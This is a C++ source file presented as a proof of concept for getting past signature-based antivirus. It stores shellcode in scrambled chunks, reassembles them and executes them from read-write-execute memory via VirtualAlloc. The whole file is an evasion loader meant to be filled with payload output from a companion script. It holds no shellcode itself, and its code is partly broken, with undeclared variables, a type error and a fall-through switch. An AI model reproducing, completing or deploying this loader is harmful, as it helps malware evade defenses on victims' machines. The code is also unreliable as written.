
/*
 * Author: 	Jake Homberg
 * File: 	BypassPOC.cpp
 * Date: 	1/30/2018
 *
 * Purpose: 	This file is a proof of concept to test a method of bypassing signature
 * 		based anti-virus. This method involves storing the shellcode that would
 * 		normally trigger the virus/malware definition when stored as one
 * 		contiguous string of bytes. 
 * 		
 * 		If the byte string to be executed is written as string [VAR NAME] = 
 * 		'[Complete shellcode]' and the source code is compiled, the shellcode 
 * 		will be stored in a section of the PE such as the .data section as 
 * 		defined. This will trigger an AV detection.
 * 		
 * 		If the byte string to be executed is chunked and stored as multiple
 * 		smaller strings out of order, it will store them as such in the .data or
 * 		a similar section. Because the bytes are out of order, we can say that
 * 		we may break up the 'signature' that the AV systems search for.
 *
 * 		To fix the buffer, a char array of sufficient size is created and the 
 * 		program will loop through the array of string pointers to strcpy the 
 * 		value of the string found at each pointer in the array.
 *
 * 		Once the buffer has been reassembled on the heap, we take it and pass 
 * 		it to the runShellcode() function as a part of a pair. The pair
 * 		consists of the char pointer and the int that gives the size of the
 * 		reassembled shellcode. It will allocate a space in memory and do a 
 * 		memcpy from the char* to the newly made space. It will then call the 
 * 		shellcode as a function to execute it.
 */ 		 

#include <iostream>
#include <Windows.h>
#include <string>
#include <vector>
#pragma warning(disable:4996)

using namespace std;

class Payload {
	/*	
		This class is built to automate the generation and calling of the
		shellcode that is obfuscated by being broken down into chunks.
		I have done my best to make sure that it is stripped down, but still
		modular.
	*/
public:
	Payload() {};
	void runShellcode(const pair<char*, int>& pairIn)
	{
		/* 
			runShellcode() takes in a pair that can be seen as (char*, int)
			The first value is a pointer to the re-assembled shellcode, while
			the second value is the int that is the total size of bytes that
			the shellcode takes up. This is required for the VirtualAlloc() call.
		*/
		void *exec = VirtualAlloc(0, pairIn.second, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		memcpy(exec, pairIn.first, pairIn.second);
		((void(*)())exec)();

	}
	void execPayload(vector<string*> stringVec, int PayloadSize, int ArrSize) {
		/*
			execPayload() is an attempt to streamline the getPayload(). At this
			point the only issue seems to be taking the array in and accessing the
			strings stored at the pointer for each. Working on using a vector as 
			an alternate solution. Still in development, but the current working
			solution is active in the getPayload() function.
		*/

		ptr = new char[PayloadSize + 1]();
		for (int i = 0; i < stringVec.size(); i++){
			temp = stringVec[i].c_str();
			strcat(ptr, temp);
		}
		runShellcode(make_pair(ptr, PayloadSize));
		free(ptr);
	}
	void getPayload(int choice) {
		/*
			getPayload() takes in the choice of what payload is to be executed. Based
			off of a switch, it will execute the payload that corresponds the input.
			Fairly straight forward.
		*/
		switch (choice) {
		case 0:
			ptr = new char[PAYLOADSize + 1]();
			for (int i = 0; i < PAYLOADArrSize; i++){
				temp = PAYLOADArr[i].c_str();
				strcat(ptr, temp);
			}
			runShellcode(make_pair(ptr, PAYLOADSize));
			free(ptr);
		default:
			cout << "[*] Invalid choice...";
		}
	}

private:
	char *ptr;
	const char *temp;
	/*
		This is where you will need to place the output from scramblePayload.py.
		For more than one payload, we will be adding cases to our switch in the 
		getPayload() function.
	*/	

};

int main() {
	Payload Generator;
	Generator.getPayload(0);
	system("PAUSE");

	exit(0);
	return 0;
}
